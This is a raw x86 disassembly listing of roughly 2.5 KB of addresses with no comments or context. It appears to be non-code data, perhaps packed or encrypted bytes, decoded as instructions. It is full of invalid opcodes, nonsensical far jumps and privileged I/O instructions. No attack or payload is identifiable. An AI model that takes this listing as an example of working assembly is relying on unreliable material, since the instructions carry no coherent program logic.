  41d18a:	add    eax,0x505036af
  41d18f:	add    eax,0xd114f6e9
  41d194:	test   al,0x7d
  41d196:	inc    edx
  41d197:	inc    ebx
  41d198:	aad    0x4f
  41d19a:	into   
  41d19b:	sahf   
  41d19c:	sub    dh,bl
  41d19e:	cld    
  41d19f:	push   edi
  41d1a0:	and    cl,cl
  41d1a2:	mov    ah,0x2
  41d1a4:	fistp  WORD PTR [ecx]
  41d1a6:	xor    BYTE PTR [edx-0x4],dl
  41d1a9:	xchg   edi,eax
  41d1aa:	aam    0x99
  41d1ac:	je     0x41d1d9
  41d1ae:	iret   
  41d1af:	xchg   bp,ax
  41d1b1:	ds aas 
  41d1b3:	fld    QWORD PTR [edi]
  41d1b5:	push   edi
  41d1b6:	push   eax
  41d1b7:	not    DWORD PTR [ecx]
  41d1b9:	xlat   BYTE PTR ds:[ebx]
  41d1ba:	mov    ah,0x5b
  41d1bc:	xor    ebx,DWORD PTR [ecx-0x1e]
  41d1bf:	(bad)  
  41d1c0:	dec    edi
  41d1c1:	adc    al,0x0
	...
  41d233:	add    bl,dh
  41d235:	and    ebp,ecx
  41d237:	push   ebp
  41d238:	(bad)  
  41d23a:	sti    
  41d23b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d23c:	pop    edi
  41d23d:	push   edx
  41d23e:	jo     0x41d1ff
  41d240:	rcr    DWORD PTR [edi+0x3a1c375e],1
  41d246:	add    DWORD PTR [eax],eax
  41d248:	test   BYTE PTR [eax],0x0
  41d24b:	add    BYTE PTR ds:0x862799c1,ch
  41d251:	or     eax,0x6b7a01ef
  41d256:	mov    cl,0xd0
  41d258:	cs sti 
  41d25a:	into   
  41d25b:	sub    eax,DWORD PTR [esi+ebp*8]
  41d25e:	retf   
  41d25f:	out    dx,al
  41d260:	dec    eax
  41d261:	jmp    0x1261e58
  41d266:	pop    esp
  41d267:	es cmp dh,0x7a
  41d26b:	lods   eax,DWORD PTR ds:[esi]
  41d26c:	jns    0x41d240
  41d26e:	jb     0x41d1f2
  41d270:	in     eax,dx
  41d271:	retf   0xfde7
  41d274:	mov    eax,ds:0xd21bbe62
  41d279:	cmp    edx,esp
  41d27b:	test   eax,0x171d6f61
  41d280:	aas    
  41d281:	js     0x41d2d6
  41d283:	or     BYTE PTR [edi-0x233f7fff],ch
  41d289:	daa    
  41d28a:	ret    0xfb38
  41d28d:	jmp    0xeb2d:0x66cf6e7b
  41d294:	enter  0x27e0,0xcc
  41d298:	mov    esi,0x70c5b011
  41d29d:	mov    bh,0xdb
  41d29f:	cmc    
  41d2a0:	test   al,0xeb
  41d2a2:	dec    edi
  41d2a3:	jmp    0xedece919
  41d2a8:	jecxz  0x41d2d4
  41d2aa:	pop    esi
  41d2ab:	add    dh,dl
  41d2ad:	push   edx
  41d2ae:	scas   al,BYTE PTR es:[edi]
  41d2af:	cwde   
  41d2b0:	dec    DWORD PTR [edx]
  41d2b2:	jb     0x41d305
  41d2b4:	cmp    DWORD PTR [edi-0x7f],ecx
  41d2b7:	lea    ebp,[ebp+0x1f]
  41d2ba:	or     bl,BYTE PTR [eax]
  41d2bc:	push   eax
  41d2bd:	push   esp
  41d2be:	cmp    DWORD PTR [eax],ebp
  41d2c0:	fisub  DWORD PTR [eax+0x45]
  41d2c3:	inc    ebx
  41d2c4:	push   0xffffffc7
  41d2c6:	shl    bh,0x6b
  41d2c9:	in     al,0x23
  41d2cb:	pop    eax
  41d2cc:	adc    DWORD PTR ss:[esi-0x5b],edi
  41d2d0:	mov    ebx,0x9cdceadf
  41d2d5:	mov    edx,fs
  41d2d7:	add    BYTE PTR [eax],cl
  41d2d9:	fimul  DWORD PTR [eax+0x1]
  41d2dc:	mov    edi,0xd1ba5c03
  41d2e1:	sar    edi,1
  41d2e3:	cs jp  0x41d2f3
  41d2e6:	imul   esi,esp,0xa19c39db
  41d2ec:	in     eax,0xfa
  41d2ee:	push   esp
  41d2ef:	out    dx,al
  41d2f0:	dec    esi
  41d2f1:	mov    esi,0xcf9ec7ba
  41d2f6:	popf   
  41d2f7:	jbe    0x41d2e4
  41d2f9:	sbb    DWORD PTR ds:0xe531202c,edx
  41d2ff:	leave  
  41d300:	xor    al,BYTE PTR [ecx]
  41d302:	arpl   WORD PTR [ecx+0x22431ec2],di
  41d308:	add    al,0xb2
  41d30a:	pop    ebx
  41d30b:	mov    ch,dh
  41d30d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d30e:	repz adc dh,dl
  41d311:	sub    eax,0xb71f0745
  41d316:	jmp    0x97e5d2e9
  41d31b:	pop    ecx
  41d31c:	stos   DWORD PTR es:[edi],eax
  41d31d:	mov    eax,0x40b65595
  41d322:	dec    ecx
  41d323:	lock fsubr QWORD PTR [ebp+0xf63ad1c]
  41d32a:	popa   
  41d32b:	inc    esi
  41d32c:	fsubr  DWORD PTR [ebx+0x2170126b]
  41d332:	push   0x60
  41d334:	push   esi
  41d335:	dec    eax
  41d336:	sub    esp,DWORD PTR [esi-0x2734f554]
  41d33c:	mov    dh,0xf
  41d33e:	in     eax,0xe2
  41d340:	mov    dl,0x87
	...
  41d3b2:	add    BYTE PTR [eax],al
  41d3b4:	push   ebx
  41d3b5:	and    BYTE PTR [eax+0x5faef3ae],ah
  41d3bb:	std    
  41d3bc:	cmp    eax,0x4c
  41d3bf:	(bad)  
  41d3c0:	outs   dx,DWORD PTR ds:[esi]
  41d3c1:	dec    esi
  41d3c2:	pop    esi
  41d3c3:	adc    BYTE PTR [edx],0x3b
  41d3c6:	add    DWORD PTR [eax],eax
  41d3c8:	test   BYTE PTR [eax],0x0
  41d3cb:	add    BYTE PTR [ecx-0xe],cl
  41d3ce:	xor    edx,DWORD PTR ds:0xbf63cae5
  41d3d4:	fimul  DWORD PTR [edx]
  41d3d6:	xor    al,0xa3
  41d3d8:	mov    cl,0x2c
  41d3da:	push   eax
  41d3db:	out    0xb6,al
  41d3dd:	ins    BYTE PTR es:[edi],dx
  41d3de:	mov    al,ds:0x582c6afa
  41d3e3:	aaa    
  41d3e4:	adc    DWORD PTR [ebx-0x7a],ebp
  41d3e7:	enter  0x8a1c,0xb4
  41d3eb:	xor    dh,BYTE PTR [edx-0x6d7bb180]
  41d3f1:	mov    dh,0x69
  41d3f3:	je     0x41d3bb
  41d3f5:	or     DWORD PTR [ecx-0x4d],ecx
  41d3f8:	scas   ax,WORD PTR es:[edi]
  41d3fa:	es and al,0x95
  41d3fd:	sub    al,0x11
  41d3ff:	jg     0x41d469
  41d401:	push   eax
  41d402:	jns    0x41d39c
  41d404:	fwait
  41d405:	into   
  41d406:	(bad)  
  41d407:	sahf   
  41d408:	xor    ah,BYTE PTR [esi+0x3e5077e2]
  41d40e:	aad    0xda
  41d410:	pop    ecx
  41d411:	sub    DWORD PTR [esi],edx
  41d413:	cmc    
  41d414:	imul   esp,edi,0x344eb923
  41d41a:	xor    eax,0x3b0b7902
  41d41f:	iret   
  41d420:	fcom   DWORD PTR [ebx-0x5543e7ac]
  41d426:	mov    esp,0x14a1e0d
  41d42b:	mov    ch,0x19
  41d42d:	mov    ah,0xf7
  41d42f:	cld    
  41d430:	imul   edx,DWORD PTR gs:[edx-0x3ab8f1ee],0x9645aa7a
  41d43b:	outs   dx,DWORD PTR ds:[esi]
  41d43c:	lods   al,BYTE PTR ds:[esi]
  41d43d:	dec    ebp
  41d43e:	lods   eax,DWORD PTR ds:[esi]
  41d43f:	aas    
  41d440:	inc    esp
  41d441:	in     al,0x79
  41d443:	retf   0x16f4
  41d446:	fs jb  0x41d484
  41d449:	mov    esi,edx
  41d44b:	pop    esp
  41d44c:	pop    edx
  41d44d:	scas   eax,DWORD PTR es:[edi]
  41d44e:	cmc    
  41d44f:	mov    ecx,ebp
  41d451:	scas   al,BYTE PTR es:[edi]
  41d452:	lds    esp,FWORD PTR [ebp+eax*8-0x6626650b]
  41d459:	out    dx,al
  41d45a:	(bad)  
  41d45b:	arpl   WORD PTR [eax-0x53],di
  41d45e:	or     eax,0x6e7d270a
  41d463:	es xchg ecx,eax
  41d465:	jbe    0x41d460
  41d467:	ja     0x41d3f4
  41d469:	push   eax
  41d46a:	jle    0x41d475
  41d46c:	sub    bh,0xad
  41d46f:	push   ss
  41d470:	cmp    BYTE PTR [esi],ah
  41d472:	mov    eax,0xbcbf109f
  41d477:	jns    0x41d484
  41d479:	push   esp
  41d47a:	sub    eax,0x85d4feb8
  41d47f:	fistp  DWORD PTR [eax+eax*8-0x6]
  41d483:	and    ch,BYTE PTR [edx-0x77]
  41d486:	or     BYTE PTR [edi-0x33e9f474],bl
  41d48c:	div    DWORD PTR [ebp-0x71]
  41d48f:	adc    ch,BYTE PTR ss:[edi-0x5c]
  41d493:	fnstsw WORD PTR [edx]
  41d495:	mov    WORD PTR [eax-0x72],ss
  41d498:	push   es
  41d499:	ficomp DWORD PTR [edi]
  41d49b:	clc    
  41d49c:	and    BYTE PTR [eax],dh
  41d49e:	jb     0x41d45f
  41d4a0:	mov    ecx,0x92f8098b
  41d4a5:	jge    0x41d525
  41d4a7:	jmp    0xfc30:0x4a7fce61
  41d4ae:	int    0xad
  41d4b0:	or     al,BYTE PTR [eax]
  41d4b2:	xlat   BYTE PTR ds:[ebx]
  41d4b3:	rcl    DWORD PTR [ecx-0x53de7452],cl
  41d4b9:	test   BYTE PTR [ebp-0x2],bh
  41d4bc:	or     cl,0x6d
  41d4bf:	and    al,0x67
  41d4c1:	sti    
	...
  41d532:	add    BYTE PTR [eax],al
  41d534:	lds    esp,FWORD PTR [ebx]
  41d536:	xchg   ecx,eax
  41d537:	and    eax,0xe3f5b7f7
  41d53c:	push   ecx
  41d53d:	or     edi,DWORD PTR [edx+ecx*8+0x646af856]
  41d544:	or     BYTE PTR [ecx+eax*1],bh
  41d547:	add    dh,dh
  41d549:	add    BYTE PTR [eax],al
  41d54b:	add    BYTE PTR [ebp+esi*8+0x747aace9],bl
  41d552:	in     eax,0x3a
  41d554:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d555:	and    bh,BYTE PTR [edi+0x39]
  41d558:	dec    ebx
  41d559:	sahf   
  41d55a:	shl    BYTE PTR [edi-0x9],0x45
  41d55e:	dec    edi
  41d55f:	push   eax
  41d560:	add    bl,BYTE PTR [edx+esi*8+0x785a0304]
  41d567:	int3   
  41d568:	shr    ch,0x62
  41d56b:	adc    al,0x6b
  41d56d:	(bad)  
  41d56e:	xchg   ebx,eax
  41d56f:	(bad)  
  41d570:	xchg   ebp,eax
  41d571:	div    BYTE PTR ds:0x63dd1057
  41d577:	push   esp
  41d578:	mov    esp,0xc8a7b297
  41d57d:	adc    cl,bh
  41d57f:	or     al,0x92
  41d581:	and    BYTE PTR [edi-0x7654b5c5],cl
  41d587:	mov    esi,0xea534d8f
  41d58c:	cmp    eax,0xa031a2ea
  41d591:	pop    edi
  41d592:	mov    BYTE PTR [ebx-0x4d699a65],bh
  41d598:	bswap  ebx
  41d59a:	ret    0x9c06
  41d59d:	push   ds
  41d59e:	and    edi,DWORD PTR [edx+0x3bb62478]
  41d5a4:	mov    esi,DWORD PTR [esi+edi*8-0x67cc8595]
  41d5ab:	out    0xfb,eax
  41d5ad:	ficom  WORD PTR [ecx]
  41d5af:	sbb    DWORD PTR [edx-0x47a6b736],edx
  41d5b5:	clc    
  41d5b6:	mov    bh,0x6b
  41d5b8:	leave  
  41d5b9:	leave  
  41d5ba:	out    dx,al
  41d5bb:	lea    esp,[ebp+0x8]
  41d5be:	sub    cl,al
  41d5c0:	outs   dx,BYTE PTR ds:[esi]
  41d5c1:	out    0x2f,al
  41d5c3:	cmp    al,0xd2
  41d5c5:	push   esp
  41d5c6:	or     DWORD PTR [edi+0x2975feee],edx
  41d5cc:	out    dx,al
  41d5cd:	adc    al,0x60
  41d5cf:	fld    QWORD PTR [eax]
  41d5d1:	popf   
  41d5d2:	icebp  
  41d5d3:	cmp    ch,ah
  41d5d5:	ins    BYTE PTR es:[edi],dx
  41d5d6:	mov    cl,0x4a
  41d5d8:	(bad)  
  41d5d9:	push   cs
  41d5da:	lock arpl WORD PTR [ecx+0x643f7707],di
  41d5e1:	push   esp
  41d5e2:	mov    esi,0xb3b3d757
  41d5e7:	xchg   esi,eax
  41d5e8:	adc    BYTE PTR [eax+0x1edd60de],dl
  41d5ee:	(bad)  
  41d5ef:	idiv   DWORD PTR [ebx+0x6f]
  41d5f2:	les    ebx,FWORD PTR ds:0x44ace85
  41d5f8:	inc    ebx
  41d5f9:	xchg   esi,eax
  41d5fa:	pushf  
  41d5fb:	lods   eax,DWORD PTR ds:[esi]
  41d5fc:	xor    eax,0xa0d804a4
  41d601:	aaa    
  41d602:	sbb    BYTE PTR [ecx+0x30],bh
  41d605:	xchg   ecx,eax
  41d606:	fldcw  WORD PTR [eax+0x1d]
  41d609:	and    eax,0x879268e1
  41d60e:	mul    BYTE PTR [edx+0x7bab6d92]
  41d614:	sub    eax,0xf6d6e3cc
  41d619:	xchg   DWORD PTR [ecx+edi*8-0x66],ebp
  41d61d:	ins    DWORD PTR es:[edi],dx
  41d61e:	xor    DWORD PTR [esi],ecx
  41d620:	sbb    ebx,DWORD PTR [ecx]
  41d622:	cs xchg ebp,eax
  41d624:	loop   0x41d5ce
  41d626:	mov    bl,0x42
  41d628:	mov    ah,0xe7
  41d62a:	xchg   esi,eax
  41d62b:	iret   
  41d62c:	(bad)  
  41d62e:	pushf  
  41d62f:	lods   eax,DWORD PTR ds:[esi]
  41d630:	and    esi,DWORD PTR [esi+0x39f51a28]
  41d636:	cmp    DWORD PTR [ebx-0x2],0x13
  41d63a:	pop    ss
  41d63b:	int    0x8a
  41d63d:	inc    esp
  41d63e:	adc    al,0x74
  41d640:	add    DWORD PTR [esi],eax
	...
  41d6b2:	add    BYTE PTR [eax],al
  41d6b4:	fiadd  DWORD PTR [ecx]
  41d6b6:	ret    0xdb86
  41d6b9:	(bad)  
  41d6ba:	ficomp WORD PTR [ebp+0x8]
  41d6bd:	push   0x96e60a3b
  41d6c2:	mov    edi,0x13cfe2d
  41d6c7:	add    dh,dh
  41d6c9:	add    BYTE PTR [eax],al
  41d6cb:	add    BYTE PTR [edi],al
  41d6cd:	ins    DWORD PTR es:[edi],dx
  41d6ce:	cmp    ah,cl
  41d6d0:	out    dx,eax
  41d6d1:	inc    ecx
  41d6d2:	mov    eax,ds:0x3a96a4ce
  41d6d7:	mov    al,ds:0xe1e00df1
  41d6dc:	add    ebx,ebp
  41d6de:	cmc    
  41d6df:	add    BYTE PTR [ebp-0x64],ah
  41d6e2:	dec    esp
  41d6e3:	lods   eax,DWORD PTR ds:[esi]
  41d6e4:	and    DWORD PTR [esp+edx*8+0x3f],ebx
  41d6e8:	aad    0xfe
  41d6ea:	mov    edx,0xd4bcedcf
  41d6ef:	mov    ch,0x6a
  41d6f1:	jae    0x41d67f
  41d6f3:	or     dl,bl
  41d6f5:	adc    DWORD PTR [ecx+0x52],0xd
  41d6f9:	imul   eax,DWORD PTR [ecx+0x1803050b],0xa0ed231e
  41d703:	ins    DWORD PTR es:[edi],dx
  41d704:	daa    
  41d705:	ss scas eax,DWORD PTR es:[edi]
  41d707:	push   ebp
  41d708:	or     eax,0x34e8f936
  41d70d:	adc    eax,DWORD PTR [ebp+0x4eb32082]
  41d713:	jl     0x41d75d
  41d715:	adc    DWORD PTR [ebx+0x3e],0x664838d2
  41d71c:	xor    esi,esp
  41d71e:	loopne 0x41d6d8
  41d720:	pop    edx
  41d721:	test   DWORD PTR [ebp+0x2fa0761f],ecx
  41d727:	sti    
  41d728:	xor    esp,DWORD PTR [ebx-0x28]
  41d72b:	outs   dx,BYTE PTR ds:[esi]
  41d72c:	fdiv   st,st(1)
  41d72e:	fld    TBYTE PTR [esi]
  41d730:	inc    ebx
  41d731:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d732:	sbb    al,0x5e
  41d734:	sti    
  41d735:	cmp    ah,BYTE PTR [edi-0xc1cd55d]
  41d73b:	into   
  41d73c:	das    
  41d73d:	pop    ebx
  41d73e:	adc    eax,0xab93586e
  41d743:	lea    eax,[esi-0x4a0a8356]
  41d749:	pop    DWORD PTR [ebx-0x72]
  41d74c:	(bad)  
  41d74d:	daa    
  41d74e:	pop    ss
  41d74f:	mov    WORD PTR [edi-0x2456a3a6],ds
  41d755:	jns    0x41d736
  41d757:	xor    eax,0x480d9042
  41d75c:	pop    esp
  41d75d:	dec    ebx
  41d75e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d75f:	popf   
  41d760:	jmp    0x41d6e3
  41d762:	out    0x69,eax
  41d764:	inc    ebp
  41d765:	adc    eax,0x18fd9c7b
  41d76a:	inc    esp
  41d76b:	sbb    BYTE PTR ds:0x5b3fda33,bh
  41d771:	aam    0xa7
  41d773:	push   ecx
  41d774:	add    al,0x99
  41d776:	mov    ds:0xcb6cf423,eax
  41d77b:	(bad)  
  41d77d:	jge    0x41d769
  41d77f:	xchg   ecx,eax
  41d780:	cmp    al,0x90
  41d782:	scas   al,BYTE PTR es:[edi]
  41d783:	pushf  
  41d784:	enter  0xc43a,0xa8
  41d788:	call   0x33b7:0xa467632e
  41d78f:	and    ah,ch
  41d791:	jmp    0x48e9:0x91a51a06
  41d798:	add    bl,BYTE PTR [ecx-0x7af75ef5]
  41d79e:	data16 neg BYTE PTR [ebx+0x22e57545]
  41d7a5:	shl    DWORD PTR [ebp+0x6308274c],cl
  41d7ab:	fistp  QWORD PTR [esi]
  41d7ad:	fidiv  WORD PTR [esi+0x5d1c682b]
  41d7b3:	bound  esi,QWORD PTR [ecx]
  41d7b5:	cs pusha 
  41d7b7:	jns    0x41d7a1
  41d7b9:	cmp    dh,0xca
  41d7bc:	push   0xffffff86
  41d7be:	fwait
  41d7bf:	repz std 
  41d7c1:	dec    ebp
	...
  41d832:	add    BYTE PTR [eax],al
  41d834:	arpl   WORD PTR [ebp*4-0x44200cc],si
  41d83b:	ja     0x41d7c4
  41d83d:	repnz pop es
  41d83f:	add    ebx,DWORD PTR [ebx-0x57]
  41d842:	mov    eax,0x13df43e
  41d847:	add    dh,dh
  41d849:	add    BYTE PTR [eax],al
  41d84b:	add    BYTE PTR [ecx-0x7650870f],bh
  41d851:	test   al,0x90
  41d853:	cwde   
  41d854:	(bad)  
  41d855:	cli    
  41d856:	mov    ch,0x73
  41d858:	xor    dl,cl
  41d85a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d85b:	pop    ss
  41d85c:	or     al,0xd0
  41d85e:	push   ecx
  41d85f:	push   0x29
  41d861:	outs   dx,BYTE PTR ds:[esi]
  41d862:	das    
  41d863:	je     0x41d81f
  41d865:	pop    ds
  41d866:	add    DWORD PTR ds:0xf3a7934c,esi
  41d86c:	or     ah,0xcc
  41d86f:	mov    WORD PTR [edi+0x39],gs
  41d872:	test   al,0xf8
  41d874:	pop    edi
  41d875:	data16 mov dh,bl
  41d878:	mov    ds:0xcdde7017,eax
  41d87d:	daa    
  41d87e:	adc    edi,ebp
  41d880:	pop    es
  41d881:	jecxz  0x41d852
  41d883:	jg     0x41d86e
  41d885:	cmp    ecx,DWORD PTR [esi-0x674cd586]
  41d88b:	out    dx,eax
  41d88c:	gs cmc 
  41d88e:	sahf   
  41d88f:	jmp    0x58af4d35
  41d894:	out    0x85,eax
  41d896:	mov    al,0x39
  41d898:	lahf   
  41d899:	cmp    al,0x8b
  41d89b:	mov    ebx,0xeba5da74
  41d8a0:	jmp    0xdd0c:0x5f8c47cf
  41d8a7:	loopne 0x41d903
  41d8a9:	cmp    BYTE PTR [eax+0x62],bl
  41d8ac:	xor    eax,0xa4f4319a
  41d8b1:	(bad)  
  41d8b2:	loope  0x41d8cd
  41d8b4:	enter  0xbd79,0x46
  41d8b8:	je     0x41d849
  41d8ba:	and    al,0x9
  41d8bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8bd:	mov    esi,0x6da11dab
  41d8c2:	jnp    0x41d92b
  41d8c4:	mov    ebp,fs
  41d8c6:	pop    es
  41d8c7:	push   esp
  41d8c8:	rol    BYTE PTR [edi+0x376489cf],1
  41d8ce:	dec    esp
  41d8cf:	mov    es,WORD PTR [edx+edi*2]
  41d8d2:	add    ebp,DWORD PTR [edi]
  41d8d4:	push   eax
  41d8d5:	jno    0x41d931
  41d8d7:	cmp    eax,0xa5a9c14d
  41d8dc:	mov    al,0xc
  41d8de:	xchg   ebx,eax
  41d8df:	shr    DWORD PTR [esi+0x20ceece2],cl
  41d8e5:	shr    BYTE PTR [ebx],cl
  41d8e7:	push   ebp
  41d8e8:	ret    0x27c7
  41d8eb:	rol    eax,0x50
  41d8ee:	inc    esp
  41d8ef:	inc    esp
  41d8f0:	jl     0x41d87f
  41d8f2:	push   ebp
  41d8f3:	mov    eax,ds:0x537f6918
  41d8f8:	pop    eax
  41d8f9:	cdq    
  41d8fa:	jmp    0x41d92d
  41d8fc:	nop
  41d8fd:	mov    al,0xe9
  41d8ff:	(bad)  
  41d900:	sub    DWORD PTR [ebx-0x69],ecx
  41d903:	xchg   esi,eax
  41d904:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41d906:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d907:	sub    BYTE PTR [ebx+0x49],0xd2
  41d90b:	sub    al,0xed
  41d90d:	ss jmp 0x41d8df
  41d910:	xor    BYTE PTR [ecx+ebp*8],ah
  41d913:	retf   0x23eb
  41d916:	es adc edi,0xf588c97d
  41d91d:	inc    edi
  41d91e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d91f:	lods   al,BYTE PTR ds:[esi]
  41d920:	push   0xf4e91969
  41d925:	jo     0x41d8dd
  41d927:	push   es
  41d928:	pop    edx
  41d929:	mov    ds:0xb1ea102e,al
  41d92e:	push   edi
  41d92f:	xchg   edx,eax
  41d930:	mov    eax,ds:0x1636b646
  41d935:	fcmovne st,st(2)
  41d937:	dec    ebx
  41d938:	ficom  DWORD PTR [edx]
  41d93a:	push   esi
  41d93b:	cwde   
  41d93c:	daa    
  41d93d:	xor    DWORD PTR [esi+0x2f2f05],ebx
	...
  41d9b3:	add    al,dh
  41d9b5:	retf   0xfc94
  41d9b8:	mov    esi,0xfdcef8fe
  41d9bd:	cwde   
  41d9be:	sbb    eax,0x9ff4651c
  41d9c3:	hlt    
  41d9c4:	jmp    0x0:0xf600013e
  41d9cb:	add    BYTE PTR [ebp+eiz*8-0x75d45b6a],dl
  41d9d2:	push   ds
  41d9d3:	inc    esi
  41d9d4:	call   0x338:0xaa473dd8
  41d9db:	jge    0x41d9b9
  41d9dd:	mov    al,ds:0x52ae87b7
  41d9e2:	pop    eax
  41d9e3:	cmp    eax,0xfbc390d7
  41d9e8:	fdivr  QWORD PTR [esi+0x5def4b39]
  41d9ee:	fdiv   QWORD PTR [ebp+0x2d]
  41d9f1:	push   edx
  41d9f2:	mov    cl,0xa6
  41d9f4:	mov    ebx,0x1d40018a
  41d9f9:	cmp    DWORD PTR [edx],edx
  41d9fb:	adc    ebx,ebp
  41d9fd:	test   al,0x43
  41d9ff:	retf   
  41da00:	or     eax,0xe064f69
  41da05:	dec    edx
  41da06:	fwait
  41da07:	sahf   
  41da08:	cmp    bh,dl
  41da0a:	jmp    0x8582:0x74a809d8
  41da11:	and    al,0x74
  41da13:	idiv   BYTE PTR [ecx+0x5a]
  41da16:	ret    
  41da17:	push   ds
  41da18:	mov    dl,0x7f
  41da1a:	scas   eax,DWORD PTR es:[edi]
  41da1b:	stos   DWORD PTR es:[edi],eax
  41da1c:	add    DWORD PTR [ecx-0x2a],esp
  41da1f:	mov    edi,0x1a22d3a
  41da24:	sub    DWORD PTR [ebx+ecx*1],esp
  41da27:	out    0xe7,eax
  41da29:	push   esi
  41da2a:	aas    
  41da2b:	jbe    0x41da7c
  41da2d:	outs   dx,BYTE PTR ds:[esi]
  41da2e:	sub    al,BYTE PTR [edi]
  41da30:	add    bl,ch
  41da32:	in     eax,dx
  41da33:	repz mov esp,0x3bd93928
  41da39:	rcl    bl,1
  41da3b:	into   
  41da3c:	dec    esi
  41da3d:	ds into 
  41da3f:	stos   BYTE PTR es:[edi],al
  41da40:	stos   DWORD PTR es:[edi],eax
  41da41:	xchg   ecx,eax
  41da42:	dec    ecx
  41da43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da44:	push   ecx
  41da45:	dec    eax
  41da46:	or     ebx,ebx
  41da48:	scas   eax,DWORD PTR es:[edi]
  41da49:	pop    esp
  41da4a:	inc    ecx
  41da4b:	imul   edx
  41da4d:	pop    esi
  41da4e:	xchg   ecx,eax
  41da4f:	loop   0x41da2e
  41da51:	xchg   DWORD PTR [edx],edx
  41da53:	inc    esp
  41da54:	not    DWORD PTR [ebx+0x19]
  41da57:	data16 jo 0x41da25
  41da5a:	cmp    DWORD PTR [eax-0x16aa1d9f],esi
  41da60:	lods   eax,DWORD PTR ds:[esi]
  41da61:	mov    eax,0xacd48fbc
  41da66:	fs mov ebx,0xd625af49
  41da6c:	add    DWORD PTR [ecx-0x5b],ecx
  41da6f:	jne    0x41dac7
  41da71:	or     bl,BYTE PTR [ebx+esi*8-0x22]
  41da75:	ss pop edx
  41da77:	(bad)  
  41da78:	(bad)  
  41da79:	cmp    al,0x93
  41da7b:	fimul  DWORD PTR [esi-0x3]
  41da7e:	sub    esi,esi
  41da80:	sti    
  41da81:	lock or ebp,DWORD PTR [eax-0x3f]
  41da85:	mov    cl,0x8c
  41da87:	fs shr cl,cl
  41da8a:	jmp    0x41dae3
  41da8c:	repz cmp ah,BYTE PTR [edx]
  41da8f:	cmp    DWORD PTR [ebp-0x30],ebx
  41da92:	inc    eax
  41da93:	push   0x3322b2bb
  41da98:	mov    ch,0x62
  41da9a:	es inc ebx
  41da9c:	inc    ebp
  41da9d:	mov    dh,0x7
  41da9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41daa0:	mov    ebp,0x3cc26fbb
  41daa5:	sub    al,0x15
  41daa7:	fxch   st(1)
  41daa9:	jb     0x41dacb
  41daab:	inc    ebx
  41daac:	xchg   esp,eax
  41daad:	inc    edx
  41daae:	jns    0x41daf4
  41dab0:	mov    esp,0xf7e65dd5
  41dab5:	icebp  
  41dab6:	in     eax,dx
  41dab7:	ffree  st(3)
  41dab9:	add    edx,edi
  41dabb:	jmp    0xa8771fed
  41dac0:	cdq    
  41dac1:	sbb    eax,DWORD PTR [eax]
	...
  41db33:	add    BYTE PTR [ecx],ch
  41db35:	(bad)  
  41db36:	sti    
  41db37:	pop    ebp
  41db38:	(bad)  
  41db39:	jge    0x41daea
  41db3b:	div    dl
  41db3d:	cmp    ebp,0xb
  41db40:	pop    edx
  41db41:	push   ebx
  41db42:	in     eax,0x34
  41db44:	loopne 0x41db85
  41db46:	add    DWORD PTR [eax],eax
  41db48:	test   BYTE PTR [eax],0x0
  41db4b:	add    BYTE PTR [edx-0x7a1a2674],ch
  41db51:	mov    dh,0xf
  41db53:	xor    ebx,ecx
  41db55:	mov    bh,0xa5
  41db57:	mov    ah,0x5a
  41db59:	test   DWORD PTR [eax+0x67],0xf770454f
  41db60:	sub    eax,0x6e0b10f1
  41db65:	push   0xfaf8d7c8
  41db6a:	inc    eax
  41db6b:	test   eax,0xcc352a51
  41db70:	fiadd  WORD PTR [ebx]
  41db72:	adc    al,bl
  41db74:	les    ebx,FWORD PTR [esp+eax*4+0x7f26de57]
  41db7b:	or     BYTE PTR [esi-0x383b509a],ch
  41db81:	pop    ecx
  41db82:	jp     0x41db6d
  41db84:	icebp  
  41db85:	out    0x43,al
  41db87:	cwde   
  41db88:	out    dx,eax
  41db89:	(bad)
  41db8c:	mov    edi,0x80186f06
  41db91:	cwde   
  41db92:	out    dx,eax
  41db93:	in     eax,dx
  41db94:	mov    ecx,0x7a412f1b
  41db99:	ins    DWORD PTR es:[edi],dx
  41db9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db9b:	and    eax,0x9cbd9efa
  41dba0:	mov    al,0xd7
  41dba2:	dec    ebx
  41dba3:	stc    
  41dba4:	call   FWORD PTR [edi]
  41dba6:	imul   ebx,DWORD PTR [esi+0x45],0x78d5252c
  41dbad:	push   ebp
  41dbae:	sbb    eax,DWORD PTR [eax-0x11]
  41dbb1:	xor    bh,ch
  41dbb3:	repnz inc eax
  41dbb5:	inc    ecx
  41dbb6:	sbb    ah,ah
  41dbb8:	inc    esi
  41dbb9:	sub    dl,ch
  41dbbb:	xchg   esp,eax
  41dbbc:	add    DWORD PTR [edx+0x29],0x90906611
  41dbc3:	adc    esp,DWORD PTR [ecx+edx*8+0x2e]
  41dbc7:	ins    DWORD PTR es:[edi],dx
  41dbc8:	into   
  41dbc9:	push   cs
  41dbca:	mov    esp,0xf87d2689
  41dbcf:	add    al,0x1
  41dbd1:	sti    
  41dbd2:	sub    eax,0x98073cbc
  41dbd7:	jbe    0x41db6f
  41dbd9:	(bad)  
  41dbda:	or     edx,ecx
  41dbdc:	arpl   WORD PTR [esi-0x7a],bx
  41dbdf:	cmc    
  41dbe0:	dec    eax
  41dbe1:	jo     0x41dc26
  41dbe3:	scas   eax,DWORD PTR es:[edi]
  41dbe4:	jle    0x41dbcc
  41dbe6:	push   ebp
  41dbe7:	push   ebx
  41dbe8:	popf   
  41dbe9:	popf   
  41dbea:	mov    BYTE PTR [ebx-0x4dfd7a96],ch
  41dbf0:	ins    BYTE PTR es:[edi],dx
  41dbf1:	pop    eax
  41dbf2:	mov    eax,ds:0x75923f0a
  41dbf7:	imul   ecx,DWORD PTR [eax+0x36],0xcfb027d8
  41dbfe:	pop    eax
  41dbff:	es scas eax,DWORD PTR es:[edi]
  41dc01:	cmp    al,0xac
